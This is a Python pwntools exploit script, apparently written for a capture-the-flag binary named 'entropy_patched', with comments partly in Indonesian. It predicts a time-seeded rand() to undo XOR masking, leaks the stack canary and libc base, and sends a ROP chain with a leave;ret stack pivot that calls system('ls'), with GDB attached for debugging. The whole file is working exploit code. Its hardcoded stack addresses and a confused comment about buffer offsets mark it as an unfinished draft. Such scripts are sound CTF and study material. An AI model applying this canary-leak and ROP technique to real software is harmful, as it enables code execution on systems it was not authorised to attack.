from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy_patched')
libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

p = process('./entropy_patched') 

# --- BRUTE FORCE SEED ---
p.sendline(b'72') 
server_rand = int(p.recvline().strip())
valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        break
libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    return int(line) ^ (libc_rand.rand() & 0xff)

# --- LEAK CANARY & LIBC (Tetap valid) ---
canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)

ret_addr = u64(b''.join([p8(leak_byte(i)) for i in range(104, 112)]))
libc.address = ret_addr - 0x2a575

# --- HARDCODE ALAMAT DARI GDB (UNTUK PEMBUKTIAN) ---
buffer_addr = 0x7ffc91ca8de0 # rbp asli
saved_rbp_pivot = 0x7ffc91ca8e20 # buffer asli (rbp-0x60 = 0x...d80? No, rbp = 0x...de0, rbp-0x60 = 0x...d80. Tapi GDB bilang buffer = 0x...e20. Berarti rbp = 0x...e80. Jadi kita pakai 0x...e20 sebagai buffer)
buffer_addr = 0x7ffc91ca8e20

log.success(f"Canary: {hex(canary)}")
log.success(f"Libc Base: {hex(libc.address)}")
log.success(f"Buffer Addr (Hardcoded): {hex(buffer_addr)}")

# --- ROP CHAIN ---
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0] 
system = libc.symbols['system']

cmd = b"ls\x00"

# ROP Chain
payload = p64(buffer_addr)         # Dummy rbp
payload += p64(pop_rdi)            
payload += p64(buffer_addr + 80)   
payload += p64(ret_gadget)         
payload += p64(system)             
payload = payload.ljust(72, b'A')  

payload += p64(canary)             
payload += cmd.ljust(16, b'B')     
payload += p64(buffer_addr)        # Saved RBP -> Pivot ke buffer
payload += p64(leave_ret)          # RetAddr -> leave; ret

# Attach GDB untuk melihat apakah pivot ke buffer berhasil
gdb.attach(p, gdbscript=f'''
    b *{hex(leave_ret)}
    c
''')

p.send(payload)
p.interactive()
